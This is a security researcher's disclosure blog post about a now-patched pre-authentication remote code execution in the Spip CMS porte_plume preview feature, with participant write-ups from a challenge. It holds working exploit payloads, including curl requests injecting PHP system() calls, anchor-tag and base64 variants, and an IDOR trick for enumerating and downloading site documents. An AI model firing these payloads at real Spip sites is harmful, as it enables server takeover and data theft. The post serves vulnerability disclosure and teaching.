---
author: "Laluka"
title: "Spip Preauth RCE 2024: Part 1, The Feather"
slug: "spip_preauth_rce_2024_part_1_the_feather"
date: 2024-08-02
description: "We're in 2024, and we'll do some eval. Will you do some eval with me? It's been a while! Anyway, yes, we'll cover a new pre-authentication remote code execution on Spip, default installation, abusing a recent scary code change in the porte-plume plugin! :)"
---


Hi dear Sir, Madam. Please be informed that this is the **third** article dedicated to [Spip](https://www.spip.net/) 0-day research, if you haven't read the first ones, I'd recommend reading them first!

- [RCE on Spip and Root-Me](/hacking/rce_on_spip_and_root_me/)
- [RCE on Spip and Root-Me, v2!](/hacking/rce_on_spip_and_root_me_v2/)

This article will cover the `issue and exploit` for an `Unauthenticated Remote Code Execution` found on `Spip`, it has been patched in the releases for [4-3-0-alpha2, 4-2-13, and 4.1.16](https://blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-3-0-alpha2-SPIP-4-2-13-SPIP-4.html).

<img class="img_med" src="release-note-security-headsup.png" alt="">

## What's the setup again?

This issue was tested on the latest back then: [4.2.9](https://files.spip.net/spip/archives/spip-v4.2.9.zip) Released the 8th of February 2024, its SHA1 hash is [1987a75d18a57690e288be59e1c4a114cac51d84](https://spip.lerebooteux.fr/Release-Notes-25).

Oh yeah, the issue came from the [porte_plume plugin](https://plugins.spip.net/porte_plume.html), so if you update spip without updating the plugins as well, you might still be exposed! 👏

```bash
mise install php@8.1.0       # Recent install, should work on latest as well
pecl install -f libsodium    # Dependencies for Spip crypto stuff
echo extension=sodium.so | tee -a $(php --ini | grep -ioP "/.*/php.ini") # Add sodium.so to our php.ini config file
php -S 0.0.0.0:8000          # Simple webserver
http://0.0.0.0:8000/ecrire/  # The url to visit in order to setup the site
```

From there, pick a `sqlite` backend to keep the setup minimalist, create an admin account, and voilà, you're done! It's empty as hell, yet enough to be exploited!

<img class="img_full" src="working-spip-setup.png" alt="">

## How was it caught?

Two years ago, I built and deployed a simple cron task that would pull spip core and plugin changes daily at 9pm, split the diffs in small chunks of lines, render them, and push it to one of my private discord servers. It yielded a few cute results, but nothing too scary for a few months. I was already reading as much code as I could in the actual project, but in the meantime, having these new changes was helpful to know what were the current moving parts!

And one day, [this gem](https://git.spip.net/spip/porte_plume/-/commit/3ca4cf78b96d927121c767a720203845071b7fda) came up!

<img class="img_full" src="spip-code-diff.png" alt="">

For interested readers, a [dirty push-my-diffs PoC](https://github.com/laluka/push-my-diffs) has been released and shown during a [livestream](https://www.youtube.com/watch?v=iFEDYryTKQw)! 😇

{{< youtube iFEDYryTKQw >}}

Now, let's head-out to the code part!

If you're a French reader, you'll quickly notice THE line. 

> If there is php that comes from a model in here, it must be eval'd as it's not a regular page.\
> - Someone, probably a monday morning

And the code does just that. If a flag states that modeles must be protected, then some sanitization takes place, then the page's content ends up in an eval statement!

As I've been playing with Spip for a while now, I knew this piece of code lived in the `porte_plume` plugin, and was reachable without account!

So... Can we do it? Can we reach the mighty eval statement?

<img class="img_small" src="thinking-mighty-eval.png" alt="">

## Chaining "features" to reach eval

One bug already known by quite a few researchers is the ability to abuse the previsualization feature to resolve document or images IDs to full document links. This is an IDOR in itself, has been reported, but was -afaik- deemed too painful to patch, or not prioritized.

Let's upload one image on our backend, and see how the link resolution feature behaves.

<img class="img_full" src="idor-id-to-url.png" alt="">

```bash
curl -sSkiL 'http://0.0.0.0:8000/index.php?action=porte_plume_previsu' -X POST -d 'data=AA<doc1>BB'
```

As stated, this allows us to resolve every document and images IDs to links. As files do not benefit extra protections nor ACL, once the full link (partial path and filename) is known, the file can be downloadded right away. We can basically abuse this feature to dump the whole site content. Banger!

But wait, there's more!

The code received on discord states that if some php code lends in there, it will be eval'd, so can we get our code in there?

<img class="img_full" src="porte-plume-previsu-reflect.png" alt="">

Yes, no, maybe, it's complicated... For now, the sanitization part catches us and surrounds our attempt with warnings. And breaks our payload. But the Spip templating engine is fairly complex and it's definitely 100% spaghetti!

> No blame on the devs, it's php, and will always be.

By grepping around, we can determine that links are handled in a specific way to be resolved, while reading the function's code, one can find that url slugs, text formats, and more can be (ab)used.

<img class="img_full" src="link-format-templating.png" alt="">

More can be found on the slug system with extra greps and code reading:

```bash
grep -riP '>->'
# ecrire/public/assembler.php:    // Si un lien a ete passe en parametre, ex: [<modele1>->url] ou [<modele1|title_du_lien{hreflang}->url]
# plugins-dist/textwheel/inc/lien.php:    # Penser au cas [<imgXX|right>->URL], qui exige typo('<a>...</a>')
# plugins-dist/textwheel/tests/data/typo/inline_link.txt:[<code>link avec de la typo !</code>->http://example.com]
# plugins-dist/textwheel/tests/data/typo/inline_link_title.txt:[link|title with <b>bold avec de la typo!</b>->http://example.com] and [another link|title with <b>bold avec de la typo!</b>->/tests/]
# plugins-dist/textwheel/tests/data/modeles_inline/inline_link.txt:[link <textwheel1|inline>->http://example.com] and [another link <textwheel1|inline>->/tests/]
# plugins-dist/textwheel/tests/data/modeles_inline/inline_link.txt:[<code>link <textwheel1|inline></code>->http://example.com]
# plugins-dist/textwheel/tests/data/modeles_inline/inline_link.txt:[<textwheel1|inline>->http://example.com]
# plugins-dist/textwheel/tests/data/modeles_inline/inline_link.txt:[<textwheel1|inline> and text <textwheel1|inline>->http://example.com]
# plugins-dist/textwheel/tests/data/modeles_inline/inline_link_title.txt:[link|title <textwheel1|inline>->http://example.com] and [another link|title <textwheel1|inline>->/tests/]
# plugins-dist/textwheel/tests/data/modeles_inline/inline_link_title.txt:[link|title with <b>bold <textwheel1|inline></b>->http://example.com] and [another link|title with <b>bold <textwheel1|inline></b>->/tests/]
# plugins-dist/textwheel/tests/data/base/inline_link.txt:[<code>link</code>->http://example.com]
# plugins-dist/textwheel/tests/data/base/inline_link_title.txt:[link|title with <b>bold</b>->http://example.com] and [another link|title with <b>bold</b>->/tests/]
# plugins-dist/textwheel/tests/data/modeles_block/inline_link.txt:[link <textwheel1|block>->http://example.com] and [another link <textwheel1|block>->/tests/]
# plugins-dist/textwheel/tests/data/modeles_block/inline_link.txt:[<code>link <textwheel1|block></code>->http://example.com]
# plugins-dist/textwheel/tests/data/modeles_block/inline_link.txt:[<textwheel1|block>->http://example.com]
# plugins-dist/textwheel/tests/data/modeles_block/inline_link.txt:[<textwheel1|block> and text <textwheel1|block>->http://example.com]
# plugins-dist/textwheel/tests/data/modeles_block/inline_link_title.txt:[link|title <textwheel1|block>->http://example.com] and [another link|title <textwheel1|block>->/tests/]
```

The previsualisation system is the same (or very similar) for post and comments. One easy way to get intimate with it is to play on the article redaction page.

<img class="img_full" src="article-redaction-page.png" alt="">

In here, we have the document uploader, possibility to insert documents by id, links, slugs, bold, italics, quoted, striked, code blocks, and more.

Turns out reflecting URLs with complex formatting is broken when the right suite of filters is applied! By writing a dead-simple fuzzer to submit all kinds of urls and formats, and logging the content passed to the previously mentioned eval statement, things got lit!

I won't give every working payload here, but let's analyze one

```php
[<img111111>->URL`<?php system("id");?>`]
```

This is a:

- `[foo->bar]`            # Link seen as foo, pointing on bar
- `<img111111>`           # Resolve request to a non-existing image of id 111111
- ` `text` `            # Bold text
- `<?php system("id");?>` # Php payload that executes the id command

So we have a link, made from a non-existing document, for which the slug contains a **bold** php payload!

## What's the sploit?

<img class="img_full" src="curl-exploit.png" alt="">

```bash
curl -sSkiL 'http://0.0.0.0:8000/index.php?action=porte_plume_previsu' -X POST -d 'data=AA_[<img111111>->URL`<?php system("id");?>`]_BB'
```

We're therefore abusing the unauth previsualization feature to reflect our terrific bb-text-like url that will keep the payload untouched due to the path formatting takes!

## What's the patch?

This led to two patches, one in the core, and one in the porte_plume plugin!

- In the Core:
    - Urls got their own filtering function for templating
    - https://git.spip.net/spip/spip/-/merge_requests/5973/diffs
- In the Porte Plume plugin:
    - Access Control has been added for model previsualisation from an unauth context
    - https://git.spip.net/spip/porte_plume/-/commit/97f9d6dddcadc9a01b098ec3552e204ce1c7a2ab

> Side note here, I've had past disclosure that went... Not so well.
> This one was smooth, Spip Dev Team members were helpful and quick to react! 🌹

## BONUS: What's truly happening? Tracing with X-debug!

```bash
pecl install xdebug
mkdir /tmp/traces/
cat >> $(php --ini | grep -ioP "/.*/php.ini") << EOF
zend_extension=xdebug.so
xdebug.mode = trace
xdebug.start_with_request = yes
xdebug.trace_format = 1  ; Use the computer-readable format
xdebug.output_dir = "/tmp/traces"
EOF
# Restart the php simple server
php -S 0.0.0.0:8000
# Then trigger the exploit
curl -sSkiL 'http://0.0.0.0:8000/index.php?action=porte_plume_previsu' -X POST -d 'data=AA<doc1>BB'
# Then inspect the trace
gunzip /tmp/traces/trace.2713103059.xt.gz
bat /tmp/traces/trace.2713103059.xt
```

<img class="img_full" src="exploit-trace-bat.png" alt="">

The full trace can be found here: [https://gist.github.com/laluka/609822f84ba07716c807be112b69e83a](https://gist.github.com/laluka/609822f84ba07716c807be112b69e83a)

By snipping ✀ some parts, or just grepping on our payload, we'll be able to find the exact culprits!

```php
[...] Framework initialization, autoload, boilerplate, ...
5	43	0	0.010484	569784	serialize	0		/opt/spip-rampage-2024/sources/config/ecran_securite.php	412	1	['action' => 'porte_plume_previsu', 'data' => 'AA_[<img111111>->URL`<?php system("id");?>`]_BB']
[...] Assempling many assets
22	3094	0	0.147165	7099656	function_exists	0		/opt/spip-rampage-2024/sources/ecrire/public/assembler.php	559	1	'medias_modeles_styliser'
[...] Tons of SQL & data loading
14	5393	0	0.201983	7799240	pipeline	1		/opt/spip-rampage-2024/sources/plugins-dist/textwheel/inc/texte.php	914	2	'post_echappe_html_propre'	'<p>AA_<a href="URL<code class="spip_code spip_code_inline" dir="ltr"><span class="base64php29041280866b34eef8d1b72.80300957" title="PD9waHAgc3lzdGVtKCJpZCIpOz8+"></span></code>" class=""></a>_BB</p>'
15	5394	0	0.202012	7799240	strtolower	0		/opt/spip-rampage-2024/sources/ecrire/inc/utils.php	301	1	'post_echappe_html_propre'
15	5395	0	0.202030	7799320	function_exists	0		/opt/spip-rampage-2024/sources/ecrire/inc/utils.php	302	1	'execute_pipeline_post_echappe_html_propre'
15	5396	0	0.202047	7799352	execute_pipeline_post_echappe_html_propre	1		/opt/spip-rampage-2024/sources/ecrire/inc/utils.php	303	1	'<p>AA_<a href="URL<code class="spip_code spip_code_inline" dir="ltr"><span class="base64php29041280866b34eef8d1b72.80300957" title="PD9waHAgc3lzdGVtKCJpZCIpOz8+"></span></code>" class=""></a>_BB</p>'
14	5397	0	0.202078	7799992	pipeline	1		/opt/spip-rampage-2024/sources/plugins-dist/textwheel/inc/texte.php	922	2	'post_echappe_html_propre_args'	['args' => ['args' => [...], 'connect' => NULL, 'env' => [...]], 'data' => '<p>AA_<a href="URL<code class="spip_code spip_code_inline" dir="ltr"><span class="base64php29041280866b34eef8d1b72.80300957" title="PD9waHAgc3lzdGVtKCJpZCIpOz8+"></span></code>" class=""></a>_BB</p>']
[...] Entering the Clean-Up Pipeline
13	5401	0	0.202175	7798928	echappe_retour	1		/opt/spip-rampage-2024/sources/plugins-dist/porte_plume/porte_plume_fonctions.php	867	3	'<p>AA_<a href="URL<code class="spip_code spip_code_inline" dir="ltr"><span class="base64php29041280866b34eef8d1b72.80300957" title="PD9waHAgc3lzdGVtKCJpZCIpOz8+"></span></code>" class=""></a>_BB</p>'	'php29041280866b34eef8d1b72.80300957'	'traitements_previsu_php_modeles_eval'
[...] Below us URL attrs extraction with extraire_attribut
14	5404	0	0.202243	7799088	preg_match_all	0		/opt/spip-rampage-2024/sources/ecrire/inc/texte_mini.php	316	4	',<(span|div)\\sclass=[\'"]base64php29041280866b34eef8d1b72.80300957[\'"]\\s(.*)>\\s*</\\1>,UmsS'	'<p>AA_<a href="URL<code class="spip_code spip_code_inline" dir="ltr"><span class="base64php29041280866b34eef8d1b72.80300957" title="PD9waHAgc3lzdGVtKCJpZCIpOz8+"></span></code>" class=""></a>_BB</p>'	NULL	2
14	5405	0	0.202281	7799936	extraire_attribut	1		/opt/spip-rampage-2024/sources/ecrire/inc/texte_mini.php	321	3	'<span class="base64php29041280866b34eef8d1b72.80300957" title="PD9waHAgc3lzdGVtKCJpZCIpOz8+"></span>'	'title'	???
15	5407	0	0.202320	7800160	preg_match	0		/opt/spip-rampage-2024/sources/ecrire/inc/filtres.php	1951	3	',(^.*?<(?:(?>\\s*)(?>[\\w:.-]+)(?>(?:=(?:"[^"]*"|\'[^\']*\'|[^\'"]\\S*))?))*?)(\\s+title(?:=\\s*("[^"]*"|\'[^\']*\'|[^\'"]\\S*))?)()((?:[\\s/][^>]*)?>.*),isS'	'<span class="base64php29041280866b34eef8d1b72.80300957" title="PD9waHAgc3lzdGVtKCJpZCIpOz8+"></span>'	NULL
15	5408	0	0.202355	7800712	substr	0		/opt/spip-rampage-2024/sources/ecrire/inc/filtres.php	1955	3	'"PD9waHAgc3lzdGVtKCJpZCIpOz8+"'	1	-1
15	5410	0	0.202394	7800712	filtrer_entites	1		/opt/spip-rampage-2024/sources/ecrire/inc/filtres.php	1967	1	'PD9waHAgc3lzdGVtKCJpZCIpOz8+'
14	5412	0	0.202436	7799992	base64_decode	0		/opt/spip-rampage-2024/sources/ecrire/inc/texte_mini.php	321	1	'PD9waHAgc3lzdGVtKCJpZCIpOz8+'
14	5413	0	0.202454	7799992	extraire_attribut	1		/opt/spip-rampage-2024/sources/ecrire/inc/texte_mini.php	325	3	'<span class="base64php29041280866b34eef8d1b72.80300957" title="PD9waHAgc3lzdGVtKCJpZCIpOz8+"></span>'	'lang'	???
14	5415	0	0.202498	7799992	extraire_attribut	1		/opt/spip-rampage-2024/sources/ecrire/inc/texte_mini.php	325	3	'<span class="base64php29041280866b34eef8d1b72.80300957" title="PD9waHAgc3lzdGVtKCJpZCIpOz8+"></span>'	'dir'	???
14	5417	0	0.202540	7799992	traitements_previsu_php_modeles_eval	1		/opt/spip-rampage-2024/sources/ecrire/inc/texte_mini.php	336	1	'<?php system("id");?>'
15	5418	0	0.202554	7799992	ob_start	0		/opt/spip-rampage-2024/sources/plugins-dist/porte_plume/porte_plume_fonctions.php	884	0
15	5419	0	0.202588	7817368	eval	1	'?><?php system("id");?>'	/opt/spip-rampage-2024/sources/plugins-dist/porte_plume/porte_plume_fonctions.php	886	0
16	5420	0	0.202603	7817368	system	0		/opt/spip-rampage-2024/sources/plugins-dist/porte_plume/porte_plume_fonctions.php(886) : eval()'d code	1	1	'id'
```

## BONUS: Unauth RCE on Spip... So you broke root-me again?

Well, hum... 👉👈 No. 😭

The issue has been introduced a year ago, and `Root-Me is working on a rework`! 🥳\
Therefore they did not spend time updating their Spip instance for over a year...

So, this time, a lack of updates definitely helped for security!\
Feels like [php-8.1.0-dev backdoor](https://flast101.github.io/php-8.1.0-dev-backdoor-rce/), right? 🙃

But next article will cover `Yet Another Unauth RCE` that this time worked on [Root-Me.org](https://www.root-me.org/), so I hope you enjoyed this one, and will kindly wait for the next one! 💌

> Have a nice Summer everyone! 🌻


## APPENDIX: Summer Spip Challenge!

> As this article was soon to be disclosed, I thought making a chall out of it could be appreciated.\
And it definitely did!

{{< youtube Cy9pi2BhHXM >}}

<img class="img_med" src="summer-spip-challenge-tweet.png" alt="">

Here's the TL;DR, then we'll move to the player writeups! 🎉

- 15+ folks contacted to assess ideas, find out if they were on the right track
- 7 found the right sink ([@Chocapikk_](https://x.com/Chocapikk_) first), but were struggling to bypass the `_PROTEGE_PHP_MODELES` check
- 4 have proved to have working payloads "assuming this check is passed"
- 3 Solved the challenge! 🔓
  - The initial winners are [@Vozec1](https://x.com/Vozec1) & [@_Worty](https://x.com/_Worty) (collab)
  - Then [@GuilhemRioux](https://x.com/GuilhemRioux) joined them with a funky payload!

---

### Winner Write-Up from **@Vozec1** & **@_Worty**

The `Porte Plume` plugin code is fairly short, only a few hundred lines.\
As a result, interesting functions were quickly identified. 

The ones that first caught our attention were the `traitements_previsu` and `traitements_previsu_php_modeles_eval` functions, since they themselves use the notoriously dangerous "eval" function.


```php
function traitements_previsu($texte, $nom_champ = '', $type_objet = '', $connect = null) {
	include_spip('public/interfaces'); // charger les traitements

	global $table_des_traitements;
	if (!strlen($nom_champ) || !isset($table_des_traitements[$nom_champ])) {
		$texte = propre($texte, $connect);
	} else {
		include_spip('base/abstract_sql');
		$table = table_objet($type_objet);
		$ps = $table_des_traitements[$nom_champ];
		if (is_array($ps)) {
			$ps = $ps[(strlen($table) && isset($ps[$table])) ? $table : 0];
		}
		if (!$ps) {
			$texte = propre($texte, $connect);
		} else {
			// [FIXME] Éviter une notice sur le eval suivant qui ne connait
			// pas la Pile ici. C'est pas tres joli...
			$Pile = [0 => []];
			// remplacer le placeholder %s par le texte fourni
			eval('$texte=' . str_replace('%s', '$texte', $ps) . ';');
		}
	}

	// si il y a du PHP issu de modeles, il faut l'eval ici, car on aura pas de eval final contrairement aux pages SPIP
	if (defined('_PROTEGE_PHP_MODELES')) {
		$texte = echappe_retour($texte, 'php' . _PROTEGE_PHP_MODELES, 'traitements_previsu_php_modeles_eval');
	}

	// il faut toujours securiser le texte prévisualisé car il peut contenir n'importe quoi
	// et servir de support a une attaque xss ou vol de cookie admin
	// on ne peut donc se fier au statut de l'auteur connecté car le contenu ne vient pas
	// forcément de lui
	return safehtml($texte);
}
```

and :

```php
function traitements_previsu_php_modeles_eval($php) {
	ob_start();
	try {
		$res = eval('?' . '>' . $php);
		$texte = ob_get_contents();
	} catch (\Throwable $e) {
		$texte = '<!-- Erreur -->';
	}
	ob_end_clean();
	return $texte;
}
```
As explained above, *Porte Plume* is grafted onto the various editing fields of the spip application.
It's the preview system that will call our two functions. 
As described in the comments, these functions are used to apply filters to user input.
*(Note that Spip will add its security filter on top of this)*.


### First approaches to previewing:

The preview function, authenticated or non-authenticated, takes 3 parameters:

- champ
- objet
- data

Depending on `field` and `object`, different filters are applied to `data` and the result is displayed in the following SPIP template:

```html
#CACHE{0}
[(#HTTP_HEADER{Content-Type: text/html; charset=[(#VAL|pp_charset)]})]
<div class="preview">
[(#ENV*{data}|traitements_previsu{#ENV*{champ},#ENV*{objet}}|image_reduire{500,0}|liens_absolus)]
[<hr style='clear:both;' /><div class="notes">(#NOTES)</div>]
</div>
```

These filters are contained in the table: `$table_des_traitements`, the php code will then retrieve this filter and apply it:

```php
$ps = $table_des_traitements[$nom_champ];
...
eval('$texte=' . str_replace('%s', '$texte', $ps) . ';');
```

Here are the possible filters, from `json_encode($table_of_treatments)`' output

```json
{
    "BIO": ["safehtml(propre(%s, $connect, $Pile[0]))"],
    "NOM_SITE": {
        "auteurs": "entites_html(%s)",
        "forums": "liens_nofollow(safehtml(typo(interdit_html(%s), \"TYPO\", $connect, $Pile[0])))",
        "0": "typo(%s, \"TYPO\", $connect, $Pile[0])"
    },
    "NOM": {
        "auteurs": "safehtml(supprimer_numero(typo(%s, \"TYPO\", $connect, $Pile[0])))",
        "0": "supprimer_numero(typo(%s, \"TYPO\", $connect, $Pile[0]))"
    },
    "CHAPO": ["propre(%s, $connect, $Pile[0])"],
    "DATE": ["normaliser_date(%s)"],
    "DATE_REDAC": ["normaliser_date(%s)"],
    "DATE_MODIF": ["normaliser_date(%s)"],
    "DATE_NOUVEAUTES": ["normaliser_date(%s)"],
    "DESCRIPTIF": {
        "0": "propre(%s, $connect, $Pile[0])",
        "syndic_articles": "safehtml(%s)"
    },
    "INTRODUCTION": ["propre(%s, $connect, $Pile[0])"],
    "NOM_SITE_SPIP": ["typo(%s, \"TYPO\", $connect, $Pile[0])"],
    "AUTEUR": {
        "0": "typo(%s, \"TYPO\", $connect, $Pile[0])",
        "forums": "liens_nofollow(safehtml(vider_url(%s)))"
    },
    "PS": ["propre(%s, $connect, $Pile[0])"],
    "SOURCE": {
        "0": "typo(%s, \"TYPO\", $connect, $Pile[0])",
        "syndic_articles": "safehtml(%s)"
    },
    "SOUSTITRE": ["typo(%s, \"TYPO\", $connect, $Pile[0])"],
    "SURTITRE": ["typo(%s, \"TYPO\", $connect, $Pile[0])"],
    "TAGS": {
        "0": "%s",
        "syndic_articles": "safehtml(%s)"
    },
    "TEXTE": {
        "0": "propre(%s, $connect, $Pile[0])",
        "forums": "liens_nofollow(safehtml(propre(interdit_html(%s), $connect, $Pile[0])))"
    },
    "TITRE": {
        "0": "supprimer_numero(typo(%s, \"TYPO\", $connect, $Pile[0]))",
        "forums": "liens_nofollow(safehtml(typo(interdit_html(%s), \"TYPO\", $connect, $Pile[0])))"
    },
    "TYPE": {
        "0": "typo(%s, \"TYPO\", $connect, $Pile[0])",
        "mots": "supprimer_numero(typo(%s, \"TYPO\", $connect, $Pile[0]))"
    },
    "DESCRIPTIF_SITE_SPIP": ["propre(%s, $connect, $Pile[0])"],
    "SLOGAN_SITE_SPIP": ["typo(%s, \"TYPO\", $connect, $Pile[0])"],
    "ENV": ["entites_html(%s,true)"],
    "*": {
        "0": false,
        "DATA": "safehtml(%s)"
    },
    "VALEUR": {
        "DATA": "safehtml(%s)"
    },
    "PARAMETRES_FORUM": ["spip_htmlspecialchars(%s)"],
    "NOTES": {
        "forums": "liens_nofollow(safehtml(propre(interdit_html(%s), $connect, $Pile[0])))"
    },
    "URL_SITE": {
        "forums": "safehtml(vider_url(%s))"
    },
    "EMAIL_AUTEUR": {
        "forums": "safehtml(vider_url(%s))"
    },
    "URL": {
        "syndic_articles": "safehtml(%s)"
    },
    "URL_SOURCE": {
        "syndic_articles": "safehtml(%s)"
    },
    "LESAUTEURS": {
        "syndic_articles": "safehtml(%s)"
    },
    "FICHIER": ["get_spip_doc(%s)"],
    "CREDITS": {
        "documents": "typo(%s, \"TYPO\", $connect, $Pile[0])"
    },
    "SLOGAN": {
        "plugins": "propre(%s, $connect, $Pile[0])"
    },
    "VMAX": {
        "plugins": "denormaliser_version(%s)"
    },
    "DESCRIPTION": {
        "paquets": "propre(%s, $connect, $Pile[0])"
    },
    "VERSION": {
        "paquets": "denormaliser_version(%s)"
    },
    "MAJ_VERSION": {
        "paquets": "denormaliser_version(%s)"
    }
}
```

Here's the list of functions we can call with `data` as a parameter:

- safehtml
- propre
- entites_html
- liens_nofollow
- interdit_html
- supprimer_numero
- typo
- normaliser_date
- spip_htmlspecialchars
- vider_url
- get_spip_doc
- denormaliser_version 

As an example, `field=TAGS` can be used to avoid applying an additional function to spip's sanitizer:

```php
"TAGS":{"0":"%s", ...}
```

<img class="img_big" src="champ-tags-1.png" alt="">

Here, using `field=TEXT` calls the `own` function:

<img class="img_big" src="champ-tags-2.png" alt="">

Unfortunately, none of these functions seems to be vulnerable. They're all short, with no apparent sink for executing arbitrary code.  

### First SINK and partial exploitation path

Going down into the `treatments_previsu` function, we find this code in php:

```php
...
if (defined('_PROTEGE_PHP_MODELES')) {
	$texte = echappe_retour($texte, 'php' . _PROTEGE_PHP_MODELES, 'traitements_previsu_php_modeles_eval');
}
...
```

This sink is very interesting, because if the global variable `_PROTEGE_PHP_MODELES` is defined, then a call to the function `echappe_retour` is made with our parameter `$texte` and the 2nd interesting function in the 3rd parameter.

As a reminder, here's the code for the `traitements_previsu_php_modeles_eval` function:

```php
function traitements_previsu_php_modeles_eval($php) {
	ob_start();
	try {
		$res = eval('?' . '>' . $php);
		$texte = ob_get_contents();
	} catch (\Throwable $e) {
		$texte = '<!-- Erreur -->';
	}
	ob_end_clean();
	return $texte;
}
```

It takes php code as a parameter and executes it in an eval.

*Smells good :D*

Let's analyze the code of within the `echappe_retour` function:

```php
function echappe_retour($letexte, $source = '', $filtre = '') {
	if (strpos($letexte, (string) "base64$source")) {
		### spip_log(spip_htmlspecialchars($letexte));  ## pour les curieux
		$max_prof = 5;
		while (
			strpos($letexte, '<') !== false
			and
			preg_match_all(
				',<(span|div)\sclass=[\'"]base64' . $source . '[\'"]\s(.*)>\s*</\1>,UmsS',
				$letexte,
				$regs,
				PREG_SET_ORDER
			)
			and $max_prof--
		) {
			foreach ($regs as $reg) {
				$rempl = base64_decode(extraire_attribut($reg[0], 'title'));
				// recherche d'attributs supplementaires
				$at = [];
				foreach (['lang', 'dir'] as $attr) {
					if ($a = extraire_attribut($reg[0], $attr)) {
						$at[$attr] = $a;
					}
				}
				if ($at) {
					$rempl = '<' . $reg[1] . '>' . $rempl . '</' . $reg[1] . '>';
					foreach ($at as $attr => $a) {
						$rempl = inserer_attribut($rempl, $attr, $a);
					}
				}
				if ($filtre) {
					$rempl = $filtre($rempl);
				}
				$letexte = str_replace($reg[0], $rempl, $letexte);
			}
		}
	}
	return $letexte;
}
```

Our third argument is passed to the `$filter` variable, which is called in a condition  with a `refill` parameter.

Quickly, the function checks that our input contains a `<span>` or `<div>` tag with a `class` attribute equal to `base64php` + `_PROTEGE_PHP_MODELES`.\
Finally, it extracts the `title` attribute and decodes it in base64 before storing it in the `$rempl` variable.

If we take the liberty of modifying the php code to set a value for `_PROTEGE_PHP_MODELES`, we can achieve code execution!

> Small lalu-note here: Congrats to `@Chocapikk_` on this one, he came first with the following payload `<div class="base64php" title="PD9waHAgZWNobyBzeXN0ZW0oJ2lkJyk7Pz4K"></div>` which works assuming `_PROTEGE_PHP_MODELES` is empty! 🌻

I add the following code to the `treatments_previsu` function:

```php
define('_PROTEGE_PHP_MODELES', 'RCE_POC');
```

In order to execute the `id` command, by forging the following title:

```bash
[~/Desktop]$ echo "<?php system('id')?>" | base64
PD9waHAgc3lzdGVtKCdpZCcpPz4K
```

Finally, here's our payload:

```html
<div class="base64phpRCE_POC" title="PD9waHAgc3lzdGVtKCdpZCcpPz4K" ></div>
```

<img class="img_big" src="id-commande-executed.png" alt="">

#### Back to reality

We spent several hours trying to figure out how to define the global variable `_PROTEGE_PHP_MODELES`.
We had an almost complete code execution, but we were missing this variable.

The only occurrence and definition of `_PROTEGE_PHP_MODELES` is in the `protege_js_modeles` function in the `ecrire/inc/texte_mini.php` file, but it seems impossible to reach the `define` function call because of the native spip filter.

So we had to move on and find another path to code execution.

### Presentation of SPIP templates

Spip embeds templates called `squelettes` which are used to render php code.
A markup language specific to SPIP is used to generate this code, and it is in these templates that injection resided a few months ago, resulting in command execution (cf: [icalendar generation](https://thinkloveshare.com/hacking/rce_on_spip_and_root_me_v2/)).

Templates can be called up via the `data` parameter, which is contained in the various plug-in codes as well as in `/squelettes-dist/modeles`.

An example would be to create `foreach.html` with the following content:

```html
#PUCE #ENV{cle} => #ENV{valeur}<br />
```

<img class="img_big" src="foreach-template-call.png" alt="">

*Note that parameters are not taken into account since they are not in the rendering context*

#### Finding and discovering templating tags

All SPIP templating tags are defined in the `ecrire/public/tags.php` file.\
There are dozens of them, some of which seem very interesting, such as `#EVAL`:

- `#EVAL{code}` produces `eval('return code;')`

Unfortunately, none of the current templates had this tag.

Then, still looking for a way to define `_PROTEGE_PHP_MODELES`, we looked for a way to define a variable in PHP's global context.
Despite the existence of the `#SET` tag, it didn't allow us to define the variable for the entire PHP application.

### The right way

We then looked at how PHP loads templates, and made an interesting discovery.

The `include_template` function from `ecrire/public/assembler.php` is called to recognize and load the various templates:

```php
function inclure_modele($type, $id, $params, $lien, string $connect = '', $env = []) {

	...

	if (!$fond and !trouve_modele($fond = $type)) {
		spip_log("Modele $type introuvable", _LOG_INFO_IMPORTANTE);
		$compteur--;
		return false;
	}
	$fond = 'modeles/' . $fond;

	...

	if (
		strstr(
			' ' . ($classes = extraire_attribut($retour, 'class')) . ' ',
			'spip_lien_ok'
		)
	) {
		$retour = inserer_attribut(
			$retour,
			'class',
			trim(str_replace(' spip_lien_ok ', ' ', " $classes "))
		);
	} else {
		if ($lien) {
			$retour = "<a href=\"" . $lien['href'] . "\" class=\"" . $lien['class'] . "\">" . $retour . '</a>';
		}
	}	
	...
}
```

The function checks whether the template name exists and, if it does, adds the content to the response.\
The vulnerability lies here, in the last lines, the parameters `$link['href]` and `$link['class]` are not sanitized!

So, if we control one of the two parameters, we'll be able to inject php tags and execute our malicious code!

### Method 1: Long and tedious

The `$link` variable is passed as a function parameter. Going back up the function call tree, we find that it's the `process` function that calls `include_modele`:

So we're looking for the origin of `$m['link']`:

```php
$modele = inclure_modele($m['type'], $m['id'], $params, $m['lien'], $connect ?? '', $env);
```

By reading the code, we understand that `$m` comes from `$models`, itself coming from :

```php
$modeles = $this->collecter($texte, ['collecter_liens' => true]);
```

Let's skip the dozens of boring php lines, but here's what you need to remember:

- The `process` function calls the vulnerable `include_modele` function with its `$m['link']` parameter
- `$m['link']` comes from a call to the `collecter` function, which takes our complete input as a parameter
- This function `collecter` calls the function `collecteur` (yes ..) with the following regex:
  - `@<([a-z_-]{3,})\s*([0-9]*)\s*([|](?:<[^<>]*>|[^>])*?)?\s*/?>@isS`

- If there's a match with this regex in our payload, then it performs further checks on tag length or type and finally parses the following attributes, which it stores in the `link` array:
  - href
  - class
  - type
  - title
  - hreflang

As you can see, the `class` and `href` parameters can be arbitrarily controlled using the `<a>` tag. 

Here's a payload that passes the various checks and defines the two vulnerable variables:

*Be careful not to forget `<foreach|a|b>` in the `<a>` tag to call the include_modele function*

```php
<a href="A" class="B" type="C" title="D" hreflang="E"><foreach|a|b></a>
```

Finally, we can add our payload `%26lt;?php system('id');die(); ?%26gt;` to one of the two vulnerable fields:

```html
<a href="A" class="%26lt;?php system('id');die(); ?%26gt;" type="C" title="D" hreflang="E"><foreach|a|b></a>
# or
<a href="%26lt;?php system('id');die(); ?%26gt;" class="B" type="C" title="D" hreflang="E"><foreach|a|b></a>
```

<img class="img_big" src="rce1.png" alt="">

### Method 2: Fast and efficient

We only saw this line in the comments after completing the first method:

```
// Si un lien a ete passe en parametre, ex: [<modele1>->url] ou [<modele1|title_du_lien{hreflang}->url]
```

It is thus possible to pass a link as a parameter via `[]`!\
Once again, you get command execution:

```php
data=[<foreach|a|b>->%26lt;?php system('id');die(); ?%26gt;>]
```

<img class="img_big" src="rce2.png" alt="">

The `process` function is called by `process_models`, itself called by the `own` function.\
